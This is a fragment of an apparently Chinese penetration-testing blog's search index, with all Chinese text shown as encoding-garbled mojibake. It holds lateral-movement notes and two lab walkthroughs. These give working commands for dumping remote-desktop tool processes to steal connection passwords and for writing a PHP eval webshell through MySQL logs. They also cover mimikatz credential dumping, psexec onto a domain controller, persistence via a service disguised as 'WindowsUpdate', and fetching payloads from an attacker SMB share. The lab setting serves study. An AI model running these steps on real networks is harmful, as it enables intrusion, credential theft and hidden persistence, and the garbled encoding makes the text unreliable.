å¥—ä»¶ä¸­å¾ˆå¤šè„šæœ¬éƒ½å¯ä»¥å®ç°PTHï¼Œä¾‹å¦‚psexec.pyã€smbexec.pyã€wmiexec.py\nä½¿ç”¨æ—¶å¯å€ŸåŠ©å†…ç½‘ä»£ç†ç­‰æŠ€æœ¯è¿›è¡Œæ”»å‡»\næ°¸æ’ä¹‹è“ ms17-010ï¼Œé¶åœºå¸¸å®¢ï¼Œä¸åšèµ˜è¿°\nåˆ©ç”¨è¿œæ§è½¯ä»¶æ¥ç®¡æ¡Œé¢ è¿™ä¹Ÿæ˜¯åˆ©ç”¨è¿œæ§è½¯ä»¶ä»£æ›¿RDPçš„ä¸€ç§æ€è·¯\nè¿™é‡Œè®°å½•ä¸¤ç§å¸¸è§çš„è½¯ä»¶çš„åˆ©ç”¨ï¼šå‘æ—¥è‘µå’Œtodesk\nç›®æ ‡ä¸»æœºå®‰è£…äº†è¿™ç±»è¿œæ§è½¯ä»¶ä¸”ä¸ºç™»é™†çŠ¶æ€ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ç›´æ¥dumpè½¯ä»¶çš„è¿›ç¨‹ï¼Œç„¶åè·å–dumpæ–‡ä»¶ä¸­å­˜å‚¨çš„è¿æ¥ç å’Œè¿æ¥å¯†ç \nå‘æ—¥è‘µ ç›®æ ‡ä¸»æœºæœ‰å‘æ—¥è‘µçš„æƒ…å†µ\né¦–å…ˆè·å–è¿›ç¨‹PID\ntasklist | find /I \u0026#34;SunloginClient.exe\u0026#34; è¿™é‡Œé€‰æ‹©éserviceçš„è¿›ç¨‹çš„PIDï¼Œç„¶åä½¿ç”¨procdumpæ¥dumpè¿™ä¸ªè¿›ç¨‹ï¼š\nprocdump.exe -accepteula -ma 5384 è¿™æ ·å°±å¾—åˆ°äº†ä¸€ä¸ª.dmpæ–‡ä»¶\nå°†è¯¥.dmpæ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥ä½¿ç”¨010å»åˆ†æè¿™ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨0xSheå¸ˆå‚…çš„æå–å·¥å…·ä¸€é”®æå–äº†ï¼š\nç¡®å®å’Œè½¯ä»¶æ˜¾ç¤ºçš„æ•°æ®ä¸€æ ·ï¼š\nToDesk æ¥ä¸‹æ¥æ˜¯ç›®æ ‡ä¸»æœºæœ‰å‘æ—¥è‘µçš„æƒ…å†µï¼š\nä¾ç„¶æ˜¯å…ˆè·å–PIDï¼š\ntasklist | find /I \u0026#34;ToDesk.exe\u0026#34; æ‰¾åˆ°éserviceçš„PID\nè¿˜æ˜¯ä¸€æ ·çš„dumpä¸‹æ¥ï¼š\nprocdump64.exe -accepteula -ma 23964 ä¸‹è½½æå–åçš„.dmpæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨0xSheå¸ˆå‚…çš„æå–å·¥å…·ä¸€é”®æå–å³å¯ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯è¿™é‡Œå®šä½æ•°æ®éœ€è¦é…åˆå½“å‰æ—¥æœŸï¼š\nå’Œç›®æ ‡ä¸»æœºä¸Šçš„æ•°æ®ä¸€æ ·ï¼š\nè·å–åˆ°è®¾å¤‡ä»£ç å’Œè¿æ¥å¯†ç åï¼Œå³å¯ç›´æ¥è¿œæ§æ¡Œé¢\n",
        "summary": "æ¨ªå‘ç§»åŠ¨å§¿åŠ¿åˆé›† æ¨ªå‘ç§»åŠ¨å§¿åŠ¿æµ…æ æ¨ªå‘ç§»åŠ¨ä¸­çš„æ–‡ä»¶ä¼ è¾“ æ¨ªå‘ç§»åŠ¨ä¹‹å‰ï¼Œéœ€è¦å¯¹æ”»å‡»è½½è·å’Œæ–‡ä»¶ç­‰çš„ä¼ è¾“åˆ¶å®šæ–¹æ¡ˆï¼ˆå½“ç„¶ï¼Œä½ ä½¿ç”¨c2çš„è¯å½“æˆ‘æ²¡è¯´ï¼‰\né€šè¿‡ç½‘ç»œå…±äº« å¯ä»¥å®ç°å±€åŸŸç½‘ä¹‹é—´çš„ç½‘ç»œå…±äº«ï¼Œé€šè¿‡æä¾›æœ‰æ•ˆçš„ç”¨æˆ·å‡­æ®ï¼Œç”¨æˆ·å¯ä»¥å®ç°ä¸¤å°ä¸»æœºä¹‹é—´çš„æ–‡ä»¶ä¼ è¾“\nè·å–windowsé»˜è®¤å¼€å¯çš„ç½‘ç»œå…±äº«ï¼š\nnet share C$ä¸ºCç›˜å…±äº«ï¼ŒADMIN$ä¸ºç³»ç»Ÿç›®å½•å…±äº«ï¼ŒIPC$å…±äº«éœ€è¦æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤æ¥å»ºç«‹å®‰å…¨çš„ä¼ è¾“é€šé“\nå®æˆ˜é€šå¸¸é€‰æ‹©IPCè¿æ¥ï¼Œè¯¥æ–¹æ³•é™¤äº†æ–‡ä»¶å…±äº«è¿˜èƒ½å®ç°åˆ›å»ºè®¡åˆ’ä»»åŠ¡æˆ–ç³»ç»ŸæœåŠ¡ç­‰ï¼Œè€Œå»ºç«‹IPCè¿æ¥çš„å‰ææ˜¯ï¼š\nè¿œç¨‹ä¸»æœºå¼€å¯äº†IPCè¿æ¥ è¿œç¨‹ä¸»æœº139æˆ–445ç«¯å£å¼€æ”¾ å»ºç«‹IPCè¿æ¥ï¼š\nnet use \\\\192.168.111.131\\IPC$ \u0026#34;Admin123456\u0026#34; /user:\u0026#34;yuy0ung\\administrator\u0026#34; åˆ—å‡ºè¿œç¨‹ä¸»æœºCç›˜å…±äº«æ–‡ä»¶ï¼š\ndir \\\\192.168.111.131\\C$ ä½¿ç”¨copyå¯ä»¥åœ¨ä¸¤å°ä¸»æœºä¹‹é—´ç›¸äº’å¤åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘å‘ç›®æ ‡ä¸»æœºä¸Šä¼ è¿œæ§exeï¼š\ncopy artifact.exe \\\\192.168.111.131\\C$ å»ºç«‹å…¶ä»–å…±äº«è¿æ¥å‘½ä»¤ç±»ä¼¼å¦‚C$è¿æ¥ï¼š\nnet use \\\\192.168.111.131\\C$ \u0026#34;Admin123456\u0026#34; /user:\u0026#34;yuy0ung\\Administrator\u0026#34; æ­å»ºSMBæœåŠ¡å™¨ å¯ä»¥å°è¯•åœ¨å…¬ç½‘vpsæˆ–å—æ§å†…ç½‘ä¸»æœºä¸Šæ­å»ºSMBæœåŠ¡å™¨ï¼Œå°†éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ”¾å…¥SMBæœåŠ¡å™¨çš„å…±äº«ç›®å½•å¹¶æŒ‡å®šUNCè·¯å¾„ï¼Œè®©æ¨ªå‘ç§»åŠ¨çš„ä¸»æœºèƒ½å¤Ÿè¿œç¨‹åŠ è½½å…±äº«æ–‡ä»¶ï¼Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼š\nè¦ä½¿ç”¨SMBåŒ¿åå…±äº« è¯¥SMBæœåŠ¡å™¨èƒ½å¤Ÿè¢«ç›®æ ‡ä¸»æœºè®¿é—® åœ¨linuxç³»ç»Ÿä¸Šå¯ä»¥é€šè¿‡impacketé¡¹ç›®ä¸­çš„smbserver.pyæ­å»ºSMBæœåŠ¡å™¨\næ­å»ºä¸€ä¸ªåä¸ºyuy0ungsmbï¼Œå…±äº«ç›®å½•æŒ‡å‘/root/shareçš„SMBåŒ¿åå…±äº«ï¼š\nmkdir /root/share python smbserver.py yuy0ungsmb /root/share -smb2support # æˆ–è€… impacket-smbserver evilsmb /root/share -smb2support ä» SMB server ä¸‹è½½æ–‡ä»¶\ncopy \\\\192.168.111.128\\yuy0ungsmb\\file.exe file.exe ä¸Šä¼ æ–‡ä»¶åˆ° SMB server\nnet use x: \\\\192.168.111.128\\yuy0ungsmb copy file.txt x: net use x: /delete ä½¿ç”¨ windowsè‡ªå¸¦å·¥å…· Certutil certutilç”¨äºç®¡ç†windowsè¯ä¹¦å¹¶ä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…ï¼Œå…¶æä¾›äº†ä»ç½‘ç»œä¸­ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½ï¼š\n"
    }
,
    {
        "title": "çº¢æ—¥é¶åœº01",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/",
        "content": "çº¢æ—¥é¶åœº01 å¤–ç½‘éƒ¨åˆ† ä¿¡æ¯æ”¶é›† é¦–å…ˆæ‰«æCæ®µæ‰¾ä¸€ä¸‹ç›®æ ‡ç«™ç‚¹IPï¼š\nnetdiscover -i eth0 -r 192.168.221.0/24 æ‰¾åˆ°ç«™ç‚¹å¤–ç½‘IPä¸º192.168.221.133\næ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ\nå‘ç°80ç«¯å£å¼€å¯ï¼Œå¹¶ä¸”ç«™ç‚¹å¼€å¯äº†mysqlæœåŠ¡\nè®¿é—®80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªphpinfo()é¡µé¢ï¼Œä¸”å¯ä»¥è¿›è¡Œmysqlè¿æ¥æµ‹è¯•\nä½¿ç”¨rootï¼Œrootå‘ç°mysqlå­˜åœ¨å¼±å£ä»¤\næ¥ä¸‹æ¥ä½¿ç”¨dirsearchæ‰«æä¸€ä¸‹ç½‘ç«™ç›®å½•ï¼Œå‘ç°å­˜åœ¨phpmyadminåå°ï¼Œæ˜¯ç”¨äºç®¡ç†MySQLæ•°æ®åº“çš„å·¥å…·\nç›´æ¥ä½¿ç”¨mysqlå¼±å£ä»¤rootï¼Œrootå³å¯ç™»é™†ï¼Œå‘ç°åå°å¯æ‰§è¡Œsqlè¯­å¥ï¼Œå°è¯•å†™é©¬\næŸ¥çœ‹æ•°æ®åº“æ˜¯å¦æœ‰å¯¼å…¥æƒé™ï¼Œçœ‹èƒ½å¦ç›´æ¥å¯¼å…¥æœ¨é©¬\nSHOW GLOBAL VARIABLES LIKE \u0026#39;%secure%\u0026#39; å‘ç°æ²¡æœ‰æƒé™\næŸ¥çœ‹æ˜¯å¦æœ‰å¼€å¯æ—¥å¿—è®°å½•\nSHOW GLOBAL VARIABLES LIKE â€˜%general%â€™ å‘ç°åŠŸèƒ½å…³é—­\nå¼€å¯å…¨å±€æ—¥å¿—\nSET GLOBAL general_log = ON æŒ‡å®šæ—¥å¿—å†™å…¥åˆ°ç½‘ç«™æ ¹ç›®å½•\nset GLOBAL general_log_file=\u0026#39;C:/phpStudy/WWW/log.php\u0026#39; å†™é©¬\nselect \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; è®¿é—®log.phpå¯æŸ¥çœ‹æ—¥å¿—ï¼Œç”¨èšå‰‘è¿æ¥å³å¯getshell\nç”¨èšå‰‘è¿æ¥åï¼Œå‘ç°ç›®å½•å­˜åœ¨å…¶ä»–ç½‘ç«™ï¼Œè®¿é—®/yxcmsï¼š\nå‘ç°ç½‘ç«™é¦–é¡µå­˜åœ¨é»˜è®¤å¯†ç æ³„éœ²ï¼Œç»å°è¯•ï¼Œå¯ç›´æ¥ç™»å…¥åå°\nè¿›å…¥åå°ï¼Œå‘ç°å¯ä»¥åœ¨å‰å°æ¨¡æ¿å†™å…¥ä¸€å¥è¯æœ¨é©¬\næŸ¥æ‰¾è·¯å¾„ä¸º/yxcms/protected/apps/default/view/default/shell2.phpï¼Œè®¿é—®ï¼Œè¿æ¥æˆåŠŸ\ntipsï¼šè¿™é‡Œè¿˜å­˜åœ¨ç›®å½•æµè§ˆæ¼æ´ï¼Œè®¿é—®æ²¡æœ‰é»˜è®¤é¡µé¢çš„ç›®å½•ï¼Œå¯ä»¥éå†ç›®å½•æ–‡ä»¶\næ”»å‡»å’Œåˆ©ç”¨é˜¶æ®µ ä¸Šçº¿CS å¯ä»¥ä½¿ç”¨cobalt strikeç”Ÿæˆexeä¸Šä¼ è¿œè¿ï¼Œä¹Ÿå¯ä»¥ç”Ÿæˆpowershellå‘½ä»¤ä¼ å‚ç»™webshellæ‰§è¡Œè¿œè¿\nè¿æ¥æˆåŠŸ\nå³é”®ç›®æ ‡æœºåœ¨sessionä¸­å°†sleepæ—¶é•¿è°ƒæ•´ä¸º0ï¼ŒåŠ å¿«å›æ˜¾é€Ÿåº¦\nå†å³é”®ç‚¹å‡»interactæ‰“å¼€äº¤äº’ç•Œé¢ï¼ŒæŸ¥çœ‹æƒé™ï¼š\nè¿™é‡Œä¾æ—§æ˜¯systemæƒé™ï¼Œå¦‚æœæ˜¯administratorï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹æ–¹æ³•ææƒï¼š\næŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯\nshell systeminfo å¯ä»¥çœ‹è§åªæœ‰4ä¸ªè¡¥ä¸\nç›´æ¥ä½¿ç”¨CSä¸Šçš„ms14_058ææƒå³å¯ï¼ˆä¹Ÿå¯ç›´æ¥getsystemï¼‰\nå½“ç„¶ï¼Œå¦‚æœå‘ç°ä¸Šä¼ çš„exeå’Œç³»ç»Ÿçš„ä½æ•°ä¸ä¸€æ ·ï¼ˆæ¯”å¦‚shellæ˜¯32ä½ï¼‰ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼è·å¾—ä¸€ä¸ª64ä½çš„åå¼¹shell\nåªéœ€è¦åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°æ‰¾ä¸€ä¸ª64ä½çš„è¿›ç¨‹ï¼Œå¹¶å°†åå¼¹shellå‘½ä»¤æ³¨å…¥è¿›å»ï¼Œé¦–å…ˆåœ¨å½“å‰shellä¸­æ‰§è¡Œshell tasklistæŸ¥çœ‹æœ¬åœ°è¿›ç¨‹åˆ—è¡¨ï¼š\nå¯¹äºè¢«æ³¨å…¥çš„ç›®æ ‡è¿›ç¨‹ï¼Œå¾€å¾€ä¼˜å…ˆé€‰æ‹©éç³»ç»Ÿè¿›ç¨‹ï¼Œä»¥é˜²æ­¢è¿›ç¨‹æ³¨å…¥æ“ä½œå¯¼è‡´ç³»ç»Ÿå´©æºƒï¼Œå¹¶ä¸”å°½é‡é€‰æ‹©å¸¸è§çš„ç¨‹åºè¿›ç¨‹ï¼Œè¿™é‡Œé€‰æ‹©everythingï¼š\nPIDè¿›ç¨‹ä¸º812ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š\ninject 812 x64 ç„¶åå¦å¤–é€‰æ‹©ä¸€ä¸ªç›‘å¬å™¨å³å¯\næ­¤æ—¶æƒé™ä¸ºadminï¼Œgetsystemææƒä¸€æ‰‹ï¼š\næ¢ç´¢æ„ŸçŸ¥é˜¶æ®µ å†…ç½‘ä¿¡æ¯æœé›† å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…ç½‘åŸŸç”¨æˆ·ä¿¡æ¯ï¼š\nnet view ç„¶åç›´æ¥è¿›å…¥targetæ¨¡å—å‡†å¤‡è¿›è¡Œæ¨ªå‘ç§»åŠ¨\næŠ“å–å“ˆå¸ŒåŠè½¬å‚¨æ˜æ–‡å¯†ç  CSçš„beaconåå¼¹shellè‡ªå¸¦Mimikatzå¥—ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰§è¡Œç›¸å…³å‘½ä»¤ï¼Œå®ç°å¯¹ç›®æ ‡æœºæœ¬åœ°å¯†ç å’Œå“ˆå¸Œçš„è¯»å–ï¼š\nlogonpasswords æˆåŠŸè·å–ï¼ŒåŒæ—¶ï¼Œå¯ä»¥å‘ç°è¯¥è´¦æˆ·æ˜¯åŸŸGODå†…çš„åŸŸç”¨æˆ·ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å£ä»¤å¤ç”¨ï¼Œå°è¯•ç™»0å½•å…¶ä»–ä¸»æœº\nä¼ æ’­é˜¶æ®µ ä½¿ç”¨PsExecå»ºç«‹IPCé€šé“ä¸Šçº¿åŸŸæ§ PsExecæ˜¯ä¸€ç§è½»é‡çº§Telnetæ›¿ä»£å“ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œè¿™é‡Œåœ¨targetä¸­é€‰æ‹©åŸŸæ§OWAå¹¶å¯åŠ¨psexec64ï¼ˆwin2008å¤šä¸º64ä½ï¼‰\né€‰æ‹©å¤–ç½‘ä¸»æœºadminçš„å£ä»¤ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªSMBåè®®çš„ç›‘å¬å™¨ï¼Œå¹¶é€‰æ‹©64ä½shellçš„ä¼šè¯ï¼Œå³å¯æ‰§è¡Œ\næ­¤æ—¶ï¼Œè·å¾—äº†æ¥è‡ªåŸŸæ§çš„åå¼¹è¿æ¥ï¼Œæƒé™ä¸ºsystemï¼ŒæˆåŠŸæ‹¿ä¸‹åŸŸæ§ å¦‚æ³•ç‚®åˆ¶ï¼Œä¸Šçº¿åŸŸæˆå‘˜ä¸»æœº åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨psexecä¸Šçº¿åŸŸæˆå‘˜ä¸»æœº\næŒä¹…åŒ–å’Œæ¢å¤é˜¶æ®µ åœ¨è¿™é‡Œå°è¯•åˆ©ç”¨CSè¿›è¡Œæƒé™ç»´æŒ\né€šè¿‡CSæŒä¹…åŒ–æ§åˆ¶æœåŠ¡å™¨ ä½¿ç”¨CSçš„serviceåŠŸèƒ½å¯¹å”¯ä¸€èƒ½è”é€šå¤–ç½‘çš„win7ä¸»æœºè¿›è¡Œæƒé™ç»´æŒï¼Œé¦–å…ˆç”Ÿæˆä¸€ä¸ªç”¨äºä¸Šçº¿æœåŠ¡å™¨çš„exeï¼š\né€šè¿‡attaksâ€”â€”packagesâ€”â€”windows executableæ‰“å¼€è®¾ç½®çª—å£ï¼š ç”Ÿæˆexeåï¼Œå³é”®win7ä¼šè¯ï¼Œè¿›å…¥exploreâ€”â€”file browserå¯ä»¥ç®¡ç†win7æ‰€æœ‰æ–‡ä»¶ï¼Œç‚¹å‡»å·¦ä¸‹è§’uploadä¸Šä¼ exe\næœ€åæ‰§è¡Œå‘½ä»¤ï¼Œåœ¨ç›®æ ‡æœºæœ¬åœ°å¼€å¯ä¸€ä¸ªåä¸ºWindowsUpdateçš„å¼€æœºè‡ªå¯åŠ¨æœåŠ¡ï¼Œè¯¥æœåŠ¡è¿è¡Œæ—¶ä¾¿ä¼šå¼€å¯æˆ‘ä»¬ä¸Šä¼ çš„exeï¼š\nshell sc create \u0026#34;WindowsUpdate\u0026#34; binpath= \u0026#34;cmd /c start \u0026#34;C:\\Users\\Administrator\\Desktop\\win7.exe\u0026#34;\u0026#34;\u0026amp;\u0026amp;sc config \u0026#34;WindowsUpdate\u0026#34; start= auto\u0026amp;\u0026amp;net start WindowsUpdate è‡³æ­¤ï¼Œåªè¦ç›®æ ‡æœºå¯åŠ¨ï¼Œä¾¿ä¼šå¯åŠ¨è¯¥exeå‘æˆ‘ä»¬è¿”å›æ§åˆ¶æƒï¼Œå®ç°äº†æŒä¹…åŒ–æ§åˆ¶\næ¢å¤é˜¶æ®µçš„æ”»å‡» è¿›è¡Œç—•è¿¹æ¸…ç†ï¼Œä¸»è¦æ¶‰åŠwebshellåˆ é™¤ã€mysqlæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠè®¾ç½®æ¢å¤ã€ä»¥åŠä¸Šä¼ çš„å„ç±»æ–‡ä»¶çš„åˆ é™¤ã€æ¸…æ¥šç³»ç»Ÿæ—¥å¿—\næ€»ç»“ æ€»ç»“ä¸€ä¸‹ç§¯ç´¯çš„çŸ¥è¯†ç‚¹ä¸æ“ä½œæ–¹æ³•ï¼š\nphpmyadminå¯ä»¥å®ç°mysqlæ—¥å¿—æ–‡ä»¶å†™é©¬ è¿›ç¨‹æ³¨å…¥æ”»å‡»ï¼šè¿›ç¨‹æ³¨å…¥å¯ä»¥éšè—è‡ªèº«ï¼Œä¹Ÿæ˜¯åˆ©ç”¨å¦ä¸€ä¸ªè¿›ç¨‹çš„æƒé™å®ç°æƒé™å‡çº§çš„å¸¸ç”¨åŠæ³• å†…ç½‘åŸŸä¿¡æ¯æœé›†ï¼šèƒ½å¤Ÿå¯¹è¦æ¸—é€çš„å†…ç½‘åŸŸæœ‰å¤§è‡´äº†è§£ï¼Œä»¥ç¡®å®šæ”»å‡»ç›®æ ‡å’Œä¾æ® åˆ©ç”¨Mimitakzè·å–å†…ç½‘windowsæœåŠ¡å™¨å¯†ç ï¼šè¯¥å¥—ä»¶å¯ä»¥æœ‰æ•ˆè·å–å½“å‰ä¸»æœºå„ç±»å¯†ç ï¼Œè‹¥å…¶ä¸­å­˜åœ¨åŸŸè´¦å·å¯†ç ï¼Œåˆ™å¾ˆå¯èƒ½ç›´æ¥è·å–å…¶ä»–ä¸»æœºæƒé™ é€šè¿‡psexecå»ºç«‹IPCé€šé“ï¼šå†…ç½‘ä¸­å¤§éƒ¨åˆ†ä¸»æœºæ˜¯æ— æ³•è¿æ¥å¤–éƒ¨ç½‘ç»œçš„ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡å¤–ç½‘é€šé“é€šä¿¡çš„æ–¹å¼å®ç°ä¸»æœºæ§åˆ¶ï¼Œæ­¤æ—¶åœ¨å†…ç½‘ä¸­æ„å»ºIPCé€šé“ï¼Œå°±å¯ä»¥ä½¿ç”¨IPCé€šé“ä¸è¢«æ§åˆ¶çš„å¤–ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡ï¼Œå®ç°ä¸»æœºæ§åˆ¶ ",
        "summary": "çº¢æ—¥é¶åœº01 å¤–ç½‘éƒ¨åˆ† ä¿¡æ¯æ”¶é›† é¦–å…ˆæ‰«æCæ®µæ‰¾ä¸€ä¸‹ç›®æ ‡ç«™ç‚¹IPï¼š\nnetdiscover -i eth0 -r 192.168.221.0/24 æ‰¾åˆ°ç«™ç‚¹å¤–ç½‘IPä¸º192.168.221.133\næ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æ\nå‘ç°80ç«¯å£å¼€å¯ï¼Œå¹¶ä¸”ç«™ç‚¹å¼€å¯äº†mysqlæœåŠ¡\nè®¿é—®80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªphpinfo()é¡µé¢ï¼Œä¸”å¯ä»¥è¿›è¡Œmysqlè¿æ¥æµ‹è¯•\nä½¿ç”¨rootï¼Œrootå‘ç°mysqlå­˜åœ¨å¼±å£ä»¤\næ¥ä¸‹æ¥ä½¿ç”¨dirsearchæ‰«æä¸€ä¸‹ç½‘ç«™ç›®å½•ï¼Œå‘ç°å­˜åœ¨phpmyadminåå°ï¼Œæ˜¯ç”¨äºç®¡ç†MySQLæ•°æ®åº“çš„å·¥å…·\nç›´æ¥ä½¿ç”¨mysqlå¼±å£ä»¤rootï¼Œrootå³å¯ç™»é™†ï¼Œå‘ç°åå°å¯æ‰§è¡Œsqlè¯­å¥ï¼Œå°è¯•å†™é©¬\næŸ¥çœ‹æ•°æ®åº“æ˜¯å¦æœ‰å¯¼å…¥æƒé™ï¼Œçœ‹èƒ½å¦ç›´æ¥å¯¼å…¥æœ¨é©¬\nSHOW GLOBAL VARIABLES LIKE \u0026#39;%secure%\u0026#39; å‘ç°æ²¡æœ‰æƒé™\næŸ¥çœ‹æ˜¯å¦æœ‰å¼€å¯æ—¥å¿—è®°å½•\nSHOW GLOBAL VARIABLES LIKE â€˜%general%â€™ å‘ç°åŠŸèƒ½å…³é—­\nå¼€å¯å…¨å±€æ—¥å¿—\nSET GLOBAL general_log = ON æŒ‡å®šæ—¥å¿—å†™å…¥åˆ°ç½‘ç«™æ ¹ç›®å½•\nset GLOBAL general_log_file=\u0026#39;C:/phpStudy/WWW/log.php\u0026#39; å†™é©¬\nselect \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; è®¿é—®log.phpå¯æŸ¥çœ‹æ—¥å¿—ï¼Œç”¨èšå‰‘è¿æ¥å³å¯getshell\nç”¨èšå‰‘è¿æ¥åï¼Œå‘ç°ç›®å½•å­˜åœ¨å…¶ä»–ç½‘ç«™ï¼Œè®¿é—®/yxcmsï¼š\nå‘ç°ç½‘ç«™é¦–é¡µå­˜åœ¨é»˜è®¤å¯†ç æ³„éœ²ï¼Œç»å°è¯•ï¼Œå¯ç›´æ¥ç™»å…¥åå°\nè¿›å…¥åå°ï¼Œå‘ç°å¯ä»¥åœ¨å‰å°æ¨¡æ¿å†™å…¥ä¸€å¥è¯æœ¨é©¬\næŸ¥æ‰¾è·¯å¾„ä¸º/yxcms/protected/apps/default/view/default/shell2.phpï¼Œè®¿é—®ï¼Œè¿æ¥æˆåŠŸ\ntipsï¼šè¿™é‡Œè¿˜å­˜åœ¨ç›®å½•æµè§ˆæ¼æ´ï¼Œè®¿é—®æ²¡æœ‰é»˜è®¤é¡µé¢çš„ç›®å½•ï¼Œå¯ä»¥éå†ç›®å½•æ–‡ä»¶\næ”»å‡»å’Œåˆ©ç”¨é˜¶æ®µ ä¸Šçº¿CS å¯ä»¥ä½¿ç”¨cobalt strikeç”Ÿæˆexeä¸Šä¼ è¿œè¿ï¼Œä¹Ÿå¯ä»¥ç”Ÿæˆpowershellå‘½ä»¤ä¼ å‚ç»™webshellæ‰§è¡Œè¿œè¿\nè¿æ¥æˆåŠŸ\nå³é”®ç›®æ ‡æœºåœ¨sessionä¸­å°†sleepæ—¶é•¿è°ƒæ•´ä¸º0ï¼ŒåŠ å¿«å›æ˜¾é€Ÿåº¦\nå†å³é”®ç‚¹å‡»interactæ‰“å¼€äº¤äº’ç•Œé¢ï¼ŒæŸ¥çœ‹æƒé™ï¼š\nè¿™é‡Œä¾æ—§æ˜¯systemæƒé™ï¼Œå¦‚æœæ˜¯administratorï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹æ–¹æ³•ææƒï¼š\næŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯\n"
    }
,
    {
        "title": "çº¢æ—¥é¶åœº02",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/",
        "content": "çº¢æ—¥é¶åœº02 æ¢ç´¢å‘ç°é˜¶æ®µï¼ˆä¿¡æ¯æœé›†ï¼‰ å·²çŸ¥å¤–ç½‘IPï¼š192.168.111.80ï¼Œå¯¹å…¶è¿›è¡ŒNmapæ‰«æ\nnmap -T4 -A -v 192.168.111.80 #ä½¿ç”¨-T4é€‰é¡¹è®¾ç½®æ‰«æé€Ÿåº¦ä¸ºå¿«é€Ÿï¼Œ-Aé€‰é¡¹å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹å’Œè„šæœ¬æ‰«æï¼Œ-vé€‰é¡¹å¯ç”¨è¯¦ç»†è¾“å‡º ç»“æœå¦‚ä¸‹ï¼š\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: Site doesn\u0026#39;t have a title. | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000.00; SP2 | ms-sql-info: | 192.168.111.80:1433: | Version: | name: Microsoft SQL Server 2008 R2 SP2 | number: 10.50.4000.00 | Product: Microsoft SQL Server 2008 R2 | Service pack level: SP2 | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 192.168.111.80:1433: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com |_ Product_Version: 6.1.7601 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-29T11:29:28 | Not valid after: 2054-04-29T11:29:28 | MD5: 0922:47cc:d252:0c16:f6c2:b016:a65c:5bba |_SHA-1: a463:9836:8e4c:a84c:575d:f8a9:7dc8:4f66:4299:5f2a |_ssl-date: 2024-04-29T12:41:08+00:00; 0s from scanner time. 3389/tcp open tcpwrapped | rdp-ntlm-info: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com | Product_Version: 6.1.7601 |_ System_Time: 2024-04-29T12:40:29+00:00 | ssl-cert: Subject: commonName=WEB.de1ay.com | Issuer: commonName=WEB.de1ay.com | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-28T11:30:12 | Not valid after: 2024-10-28T11:30:12 | MD5: 95dd:c1e4:588c:7e02:f29a:c6c5:a523:dfa6 |_SHA-1: 4404:e395:da84:2b4c:8506:06af:c749:d40a:cff7:9bc6 |_ssl-date: 2024-04-29T12:41:08+00:00; 0s from scanner time. 7001/tcp open http Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled) |_http-title: Error 404--Not Found 